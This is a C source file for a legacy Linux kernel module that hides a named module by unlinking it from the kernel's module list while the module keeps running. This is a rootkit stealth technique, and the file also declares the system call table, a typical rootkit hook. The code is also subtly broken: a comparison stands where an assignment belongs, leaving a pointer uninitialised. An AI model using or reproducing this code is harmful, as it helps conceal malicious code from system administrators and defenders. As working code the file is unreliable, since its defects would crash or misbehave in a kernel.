/* Module for removing modules from the module list without unloading them
 *
 * Roc Vallès Domènech
 */

#define __KERNEL__
#define MODULE

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/ctype.h>
#include <linux/mm.h>

MODULE_AUTHOR("rvalles");
MODULE_DESCRIPTION("Removes a module from the module_list without unloading the module");
MODULE_LICENSE("GPL");

extern void *sys_call_table[];

char *modulename;

MODULE_PARM(modulename, "s");

int init_module() {
	struct module *modpolling;
	
	printk("%s\n",modulename);
	if(!modulename)
		return 0;
	modpolling == &__this_module;
	if(!modpolling->next)
		return 0;
	for(;modpolling->next;modpolling = modpolling->next)
	{
		if(strcmp(modulename,modpolling->next->name) == 0)
		{
			modpolling->next = modpolling->next->next;
			return 0;
		}
	}
	
	return 0;
}

void cleanup_module() {
}

